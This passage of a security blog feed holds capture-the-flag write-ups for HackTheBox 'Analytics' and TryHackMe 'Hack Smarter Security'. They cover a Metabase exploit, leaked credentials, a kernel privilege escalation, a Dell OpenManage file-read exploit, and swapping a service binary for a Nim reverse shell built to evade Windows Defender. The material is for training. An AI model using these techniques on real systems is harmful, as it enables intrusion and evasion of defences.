<p>Craft a reverse shell with <a href="https://www.revshells.com/" target="_blank" >Reverse Shell Generator</a>

.</p>
<p>To run the exploit use</p>
<pre tabindex="0"><code>python3 main.py -u http://[targeturl] -t [setup-token] -c &#34;[command]&#34;
</code></pre><p>Setup your listener, run the command</p>
<p><img src="/images/HTB-Analytics/Metabase-xploit.png" alt="Metabase exploit running"></p>
<p>And catch a shell!</p>
<p><img src="/images/HTB-Analytics/foothold.png" alt="Initial foothold"></p>
<p>After accessing the system no flag is found in this user home directory and trying to upgrade the shell fails. We seem to be in a constrained environment with a limited amount of services/utilities, probably a container. <code>0::/</code> is discovered in both <code>/proc/1/cgroup</code> and <code>/proc/self/cgroup</code> which is a strong indication that we are operating within a container. This typically signifies that the process with <code>PID 1</code> (usually the init process) is running within a <code>cgroup</code>, which is a common characteristic of containerized environments.</p>
<p>After finding and examining the content of the script <code>/app/run_metabase.sh</code>, it appears that the environment variables are manipulated via the functions <code>file_env</code> and <code>docker_setup_env</code>.</p>
<p>Running <code>env</code> leaks some credentials.</p>
<blockquote>
<p>The <code>env</code> command prints out the current environment variables set in the shell. Environment variables are key-value pairs that hold information about the environment in which a process is running.</p>
</blockquote>
<p><img src="/images/HTB-Analytics/user-credentials.png" alt="Leaked user credentials"></p>
<pre tabindex="0"><code>META_USER=metalytics
META_PASS=An4lytics_ds20223#
</code></pre><p>We log in SSH with them.</p>
<pre tabindex="0"><code>ssh metalytics@analytical.htb
</code></pre><p>And the user flag is found at <code>/home/metalytics/user.txt</code>.</p>
<p><img src="/images/HTB-Analytics/user-flag.png" alt="User flag"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Searching for privilege escalation paths with <code>sudo -l</code> and enumerating the system manually give no leads at this point. Turning my attention to system kernel, I check its features with <code>uname -a &amp;&amp; cat /proc/version</code>.</p>
<p><img src="/images/HTB-Analytics/system-features.png" alt="System kernel version"></p>
<p>The system is running Ubuntu 22.04 and kernel version 6.2.0-25-generic. After searching for exploits I find <a href="https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/" target="_blank" >GameOver(lay)</a>

 featuring <code>CVE-2023-2640</code> and <code>CVE-2023-32629</code>. A PoC is available at this <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh" target="_blank" >Github account</a>

.</p>
<p>After running the exploit, a root shell is obtained and the root flag is accessible at <code>/root/root.txt</code>.</p>
<p><img src="/images/HTB-Analytics/root-flag.png" alt="Root flag"></p>
<p>Thanks for taking the time to check out my blog, this challenge was fairly straightforward. Keep learning and practicing!</p>
]]></content>
        </item>
        
        <item>
            <title>THM: Hack Smarter Security</title>
            <link>https://scorpiosec.com/posts/2024/03/thm-hack-smarter-security/</link>
            <pubDate>Fri, 22 Mar 2024 16:28:33 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/03/thm-hack-smarter-security/</guid>
            <description>Platform: TryHackMe Link: Hack Smarter Security Level: Medium OS: Windows In this challenge we exploit a Windows Server machine feature SSH (which is not usual). After exploiting an uncommon service we find ourselves having to bypass Windows Defender in order to achieve administrative privileges.
The target IP address is 10.10.189.226.
Recon nmap -sC -sV -oA nmap/Hack-Smarter-Security 10.10.189.226 Several ports are found to be opened:
FTP is running on port 21, with anonymous login allowed SSH on port 22, which can potentially be our way into the system if credentials are found A Windows IIS server is running on port 80 From the nmap results it is not clear which service is running on port 1311 Windows WBT server is running on port 3389, this is used for Windows Remote Desktop and Remote Assistance connections Starting Nmap 7.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: TryHackMe</li>
<li>Link: <a href="https://tryhackme.com/r/room/hacksmartersecurity" target="_blank" >Hack Smarter Security</a>

</li>
<li>Level: Medium</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>In this challenge we exploit a Windows Server machine feature SSH (which is not usual). After exploiting an uncommon service we find ourselves having to bypass Windows Defender in order to achieve administrative privileges.</p>
<p>The target IP address is <code>10.10.189.226</code>.</p>
<h2 id="recon">Recon</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Hack-Smarter-Security 10.10.189.226
</code></pre><p>Several ports are found to be opened:</p>
<ul>
<li>FTP is running on port 21, with anonymous login allowed</li>
<li>SSH on port 22, which can potentially be our way into the system if credentials are found</li>
<li>A Windows IIS server is running on port 80</li>
<li>From the nmap results it is not clear which service is running on port 1311</li>
<li>Windows WBT server is running on port 3389, this is used for Windows Remote Desktop and Remote Assistance connections</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-18 18:27 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.160.34
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.24s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">995</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>21/tcp   open  ftp           Microsoft ftpd
</span></span><span style="display:flex;"><span>| ftp-syst: 
</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| 06-28-23  02:58PM                 <span style="color:#ae81ff">3722</span> Credit-Cards-We-Pwned.txt
</span></span><span style="display:flex;"><span>|_06-28-23  03:00PM              <span style="color:#ae81ff">1022126</span> stolen-passport.png
</span></span><span style="display:flex;"><span>22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>|_http-title: HackSmarterSec
</span></span><span style="display:flex;"><span>1311/tcp open  ssl/rxmon?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GetRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> 
</span></span><span style="display:flex;"><span>|     Strict-Transport-Security: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
</span></span><span style="display:flex;"><span>|     X-XSS-Protection: 1; mode<span style="color:#f92672">=</span>block
</span></span><span style="display:flex;"><span>|     vary: accept-encoding
</span></span><span style="display:flex;"><span>|     Content-Type: text/html;charset<span style="color:#f92672">=</span>UTF-8
</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">18</span> Mar <span style="color:#ae81ff">2024</span> 23:28:22 GMT
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span style="color:#e6db74">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;html&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;META http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;link type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/oma/css/loginmaster.css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;style type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;&lt;/style&gt;
</span></span><span style="display:flex;"><span>|     &lt;script type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/oma/js/prototype.js&#34;</span> language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/oma/js/gnavbar.js&#34;</span> language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/oma/js/Clarity.js&#34;</span> language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|   HTTPOptions: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> 
</span></span><span style="display:flex;"><span>|     Strict-Transport-Security: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
</span></span><span style="display:flex;"><span>|     X-XSS-Protection: 1; mode<span style="color:#f92672">=</span>block
</span></span><span style="display:flex;"><span>|     vary: accept-encoding
</span></span><span style="display:flex;"><span>|     Content-Type: text/html;charset<span style="color:#f92672">=</span>UTF-8
</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">18</span> Mar <span style="color:#ae81ff">2024</span> 23:28:29 GMT
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span style="color:#e6db74">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;html&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;META http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;link type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/oma/css/loginmaster.css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;style type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;&lt;/style&gt;
</span></span><span style="display:flex;"><span>|_    &lt;script type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/oma/js/prototype.js&#34;</span> language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/oma/js/gnavbar.js&#34;</span> language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/oma/js/Clarity.js&#34;</span> language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>hacksmartersec/organizationName<span style="color:#f92672">=</span>Dell Inc/stateOrProvinceName<span style="color:#f92672">=</span>TX/countryName<span style="color:#f92672">=</span>US
</span></span><span style="display:flex;"><span>| Not valid before: 2023-06-30T19:03:17
</span></span><span style="display:flex;"><span>|_Not valid after:  2025-06-29T19:03:17
</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-18T23:29:06+00:00; +2s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>hacksmartersec
</span></span><span style="display:flex;"><span>| Not valid before: 2024-03-17T23:23:26
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-09-16T23:23:26
</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
</span></span><span style="display:flex;"><span>|   Target_Name: HACKSMARTERSEC
</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: HACKSMARTERSEC
</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: HACKSMARTERSEC
</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: hacksmartersec
</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: hacksmartersec
</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
</span></span><span style="display:flex;"><span>|_  System_Time: 2024-03-18T23:29:00+00:00
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port1311-TCP:V<span style="color:#f92672">=</span>7.94SVN%T<span style="color:#f92672">=</span>SSL%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>3/18%Time<span style="color:#f92672">=</span>65F8CE13%P<span style="color:#f92672">=</span>x86_64-pc-linux
</span></span><span style="display:flex;"><span>SF:-gnu%r<span style="color:#f92672">(</span>GetRequest,1089,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20\r\nStrict-Transport-Securi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ty:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Op
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:accept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0Mon,\x2018\x20Mar\x202024\x2023:28:22\x20GMT\r\nConnection:\x20close\r
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n\r\n&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\x201\.0\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Strict//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span>&gt;<span style="color:#ae81ff">\r\n</span>&lt;html&gt;<span style="color:#ae81ff">\r\n</span>&lt;head&gt;<span style="color:#ae81ff">\r\n</span>&lt;META<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Content-Type<span style="color:#ae81ff">\&#34;\x</span>20conte
</span></span><span style="display:flex;"><span>SF:nt<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\r\n</span>&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\r\n</span>&lt;link<span style="color:#ae81ff">\x</span>20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/css<span style="color:#ae81ff">\&#34;\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/oma/css
</span></span><span style="display:flex;"><span>SF:/loginmaster<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\r\n</span>&lt;style<span style="color:#ae81ff">\x</span>20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/css<span style="color:#ae81ff">\&#34;</span>&gt;&lt;/style&gt;<span style="color:#ae81ff">\r\n</span>&lt;script
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/javascript<span style="color:#ae81ff">\&#34;\x</span>20src<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/oma/js/prototype<span style="color:#ae81ff">\.</span>js<span style="color:#ae81ff">\&#34;\x</span>20langua
</span></span><span style="display:flex;"><span>SF:ge<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>javascript<span style="color:#ae81ff">\&#34;</span>&gt;&lt;/script&gt;&lt;script<span style="color:#ae81ff">\x</span>20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/javascript<span style="color:#ae81ff">\&#34;\x</span>20src<span style="color:#f92672">=</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:<span style="color:#e6db74">&#34;/oma/js/gnavbar\.js\&#34;\x20language=\&#34;javascript\&#34;&gt;&lt;/script&gt;&lt;script\x20t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ype=\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/Clarity\.js\&#34;\x20language=\&#34;ja
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:vascript\&#34;&gt;&lt;/script&gt;&lt;script\x20language=\&#34;javascript\&#34;&gt;\r\n\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTT
</span></span><span style="display:flex;"><span>SF:POptions,1089,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20ma
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-en
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:coding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Mon,\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:18\x20Mar\x202024\x2023:28:29\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!D
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:OCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\x201\.0\x20Strict//E
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:N\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\&#34;&gt;\r\n&lt;ht
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ml&gt;\r\n&lt;head&gt;\r\n&lt;META\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/html;\x20charset=UTF-8\&#34;&gt;\r\n&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;\r\n&lt;link
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20type=\&#34;text/css\&#34;\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/oma/css/loginmas
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ter\.css\&#34;&gt;\r\n&lt;style\x20type=\&#34;text/css\&#34;&gt;&lt;/style&gt;\r\n&lt;script\x20type=
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/prototype\.js\&#34;\x20language=\&#34;java
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:script\&#34;&gt;&lt;/script&gt;&lt;script\x20type=\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:gnavbar\.js\&#34;\x20language=\&#34;javascript\&#34;&gt;&lt;/script&gt;&lt;script\x20type=\&#34;tex
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:t/javascript\&#34;\x20src=\&#34;/oma/js/Clarity\.js\&#34;\x20language=\&#34;javascript\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span>&gt;&lt;/script&gt;&lt;script<span style="color:#ae81ff">\x</span>20language<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>javascript<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\r\n\x</span>20<span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host script results:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_clock-skew: mean: 2s, deviation: 0s, median: 1s
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 80.56 seconds
</span></span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<p>The nmap scan reveals that the FTP servers allows for anonymous login. After accessing the server we find two files <code>Credit-Cards-We-Pwned.txt</code> and <code>stolen-passport.png</code>.</p>
<p><img src="/images/THM-HackSmarterSecurity/ftp-server.png" alt="FTP files"></p>
<p>The file <code>Credit-Cards-We-Pwned.txt</code> contains a list of credit cards information, which are definitely fake since this is a hacking challenge.</p>
<p><img src="/images/THM-HackSmarterSecurity/fake-credit-cards.png" alt="Fake credit cards numbers"></p>
<p>The <code>stolen-passport.png</code> file fails to download because of the ASCII mode on the FTP server, images are often stored in binary format.</p>
<p><img src="/images/THM-HackSmarterSecurity/passport-img.png" alt="Password image transfer fails"></p>
<p>After switching to binary mode with <code>binary</code> the transfer is successful.</p>
<p><img src="/images/THM-HackSmarterSecurity/passport-img2.png" alt="Password image transfer success"></p>
<p>Nothing of value is gained after running <code>strings</code> and <code>exiftool</code> on the file. This ends up being a rabbit hole leading to nothing exploitable.</p>
<p><img src="/images/THM-HackSmarterSecurity/passport-img3.png" alt="Picture of the eye of the room author"></p>
<p>After visiting the website nothing of interest is found, it a static website without any working functionalities.</p>
<p><img src="/images/THM-HackSmarterSecurity/hackers-website.png" alt="Hackers website"></p>
<p>Directory and subdomain enumeration with <code>gobuster</code> is also unfruitful.</p>
<p>Trying to access the service on port <code>1311</code> with <code>http://10.10.189.226:1311/</code> produces an error.</p>
<p><img src="/images/THM-HackSmarterSecurity/port1311-error.png" alt="port 1311 error"></p>
<p>This can be solved by using <code>https</code> instead. We get a page running <code>Dell EMC OpenManage</code> login page.</p>
<p><img src="/images/THM-HackSmarterSecurity/dell-openmanage.png" alt="Dell OpenManage service"></p>
<p>Attempting to bypass the login page via the exploit found in this <a href="https://www.tenable.com/security/research/tra-2021-07" target="_blank" >Tenable blog post</a>

 is unsuccessful.</p>
<p>After clicking on <code>About</code> we discover the software is running version <code>9.4.0.2</code>.</p>
<p><img src="/images/THM-HackSmarterSecurity/Dell-OMACS-version.png" alt="Dell OMACS version"></p>
<p>Looking for exploits we find <a href="https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/" target="_blank" >CVE-2020-5377</a>

, this is a file read vulnerability in <code>Dell OpenManage Server Administrator</code>and a PoC is found <a href="https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514" target="_blank" >here</a>

.</p>
<p>Following the usage instructions we attempt to exploit the target</p>
<pre tabindex="0"><code>python3 Dell-xploit.py 10.2.104.130 10.10.189.226:1311
</code></pre><p><img src="/images/THM-HackSmarterSecurity/Dell-exploit.png" alt="Dell file read exploit"></p>
<p>We are able to read the files on the server. From the nmap scan we know that the target is running <code>Microsoft IIS</code> on port 80.</p>
<ul>
<li>The root folder for IIS is located at <code>C:\inetpub\wwwroot</code></li>
<li>In the scan results we find <code>commonName=hacksmartersec</code> under port 1311</li>
<li>We know the <code>web.config</code> file must be present at the content root path of the deployed application. You can read more about it <a href="https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0" target="_blank" >here</a>

</li>
</ul>
<p>Applying all the information we have, credentials for the user <code>tyler</code> are found at <code>C:\inetpub\wwwroot\hacksmartersec\web.config</code>.</p>
<p><img src="/images/THM-HackSmarterSecurity/creds.png" alt="Tyler SSH credentials found"></p>
<h2 id="foothold">Foothold</h2>
<p>Using <code>tyler:IAmA1337h4x0randIkn0wit!</code> we are able to login via SSH.</p>
<p><img src="/images/THM-HackSmarterSecurity/ssh-access.png" alt="SSH access with user tyler credentials"></p>
<h3 id="what-is-usertxt">What is user.txt?</h3>
<p>The user flag <code>user.txt</code> is then accessible at <code>C:\Users\tyler\Desktop\user.txt</code>.</p>
<p><img src="/images/THM-HackSmarterSecurity/user-flag.png" alt="User flag"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="creating-a-new-admin-account">Creating a new admin account</h3>
<p>We now need to find some privilege escalation paths. Attempting to use <code>winPEAS</code> for system enumeration fails, it gets flagged and stopped by Microsoft Defender.</p>
<p><img src="/images/THM-HackSmarterSecurity/winpeas-fail.png" alt="winPEAS fails because of Windows Defender"></p>
<p><a href="https://github.com/itm4n/PrivescCheck/tree/master" target="_blank" >PrivescCheck</a>

 works without being blocked by Defender.</p>
<p><img src="/images/THM-HackSmarterSecurity/privesccheck.png" alt="PrivescCheck works despite Microsoft Defender"></p>
<p>A few non-default services are found.</p>
<p><img src="/images/THM-HackSmarterSecurity/non-default-services.png" alt="A few non-default services are discovered"></p>
<p>In the <code>Services binary permissions</code> section  we find a vulnerable service called <code>spoofer-scheduler</code>. We can potentially replace <code>spoofer-scheduler.exe</code> with a malicious file of the same name to escalate our privileges since the user <code>tyler</code> has all the necessary permissions.</p>
<p><img src="/images/THM-HackSmarterSecurity/vulnerable-service.png" alt="Vulnerable service found"></p>
<p>We have to keep in mind that Windows Defender is active, so if the reverse shell isn&rsquo;t stealthy enough it will get flagged. We do have a few different ways to achieve our goals.</p>
<p>A reverse shell written in Nim that bypasses Windows Defender is available <a href="https://github.com/Sn1r/Nim-Reverse-Shell" target="_blank" >here</a>

.</p>
<p>We stop the service with <code>Stop-Service -Name &quot;spoofer-scheduler&quot;</code> and we remove the executable with <code>rm spoofer-scheduler.exe</code>.</p>
<blockquote>
<p>Don&rsquo;t forget to compile the reverse shell with <code>nim c -d:mingw --app:gui rev_shell.nim</code>.</p>
</blockquote>
<p>The Nim reverse shell is sent to the target after compilation.</p>
<p><img src="/images/THM-HackSmarterSecurity/malicious-exe.png" alt="Malicious executable file on the target"></p>
<p>After restarting the service with <code>Start-Service -Name &quot;spoofer-scheduler&quot;</code> we get a reverse shell running a privileged account.</p>
<p><img src="/images/THM-HackSmarterSecurity/privileged-shell.png" alt="Privileged shell obtained"></p>
<p>But the shell is unstable and dies quickly. Because the service is not starting properly (since we replaced the file), WIndows is timing it out.</p>
<p><img src="/images/THM-HackSmarterSecurity/service-error.png" alt="Service cannot be started and gets timed out"></p>
